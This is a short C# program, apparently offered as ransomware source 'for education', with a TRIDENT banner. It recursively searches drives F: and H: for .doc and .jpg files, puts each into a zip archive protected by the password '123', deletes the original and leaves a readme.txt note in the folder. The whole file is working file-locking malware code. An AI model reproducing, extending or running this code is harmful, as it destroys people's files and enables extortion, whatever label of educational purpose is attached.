/* 
╔════╦═══╦══╦══╗╔═══╦╗─╔╦════╗
╚═╗╔═╣╔═╗╠╗╔╣╔╗╚╣╔══╣╚═╝╠═╗╔═╝
──║║─║╚═╝║║║║║╚╗║╚══╣╔╗─║─║║
──║║─║╔╗╔╝║║║║─║║╔══╣║╚╗║─║║
──║║─║║║║╔╝╚╣╚═╝║╚══╣║─║║─║║
──╚╝─╚╝╚╝╚══╩═══╩═══╩╝─╚╝─╚╝
Created by madD3SiR3 for education
*/


using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Ionic.Zip;

namespace ConsoleApplication8
{
    class Program
    {
        static void Main(string[] args)
        {
            
            string[] drives = { "F:", "H:" }; // Drives
            foreach (string drv in drives)

            {
                IEnumerable<string> MyFiles = SafeEnumerateFiles(drv, new[] { "*.doc", "*.jpg" }, SearchOption.AllDirectories); // Extensions
                foreach (string fileName in MyFiles)
                    using (ZipFile p = new ZipFile())
                    {
                        p.CompressionLevel = Ionic.Zlib.CompressionLevel.None; // Сompression level 
                        p.Password = "123"; // Password
                        p.AddFile(fileName,""); // Add file
                        p.Save(fileName + " locked" + ".zip"); // Save file

                        File.Delete(fileName);
                        File.WriteAllText(Path.GetDirectoryName(fileName) + "/" + "readme.txt", "info"); // File info
                    }
            }
            
        }
        private static IEnumerable<string> SafeEnumerateFiles(string path, string[] searchPatterns, SearchOption searchOption)
        {
            Stack<string> dirs = new Stack<string>();
            dirs.Push(path);

            while (dirs.Count > 0)
            {
                string currentDirPath = dirs.Pop();
                if (searchOption == SearchOption.AllDirectories)
                {
                    try
                    {
                        string[] subDirs = Directory.GetDirectories(currentDirPath);
                        foreach (string subDirPath in subDirs)
                        {
                            dirs.Push(subDirPath);
                        }
                    }
                    catch (UnauthorizedAccessException)
                    {
                        continue;
                    }
                    catch (DirectoryNotFoundException)
                    {
                        continue;
                    }
                }

                foreach (string searchPattern in searchPatterns)
                {
                    string[] files;
                    try
                    {
                        files = Directory.GetFiles(currentDirPath, searchPattern);
                    }
                    catch (UnauthorizedAccessException)
                    {
                        break;
                    }
                    catch (DirectoryNotFoundException)
                    {
                        break;
                    }
                    foreach (string filePath in files)
                    {
                        yield return filePath;
                    }
                }
            }
        }

    }
}

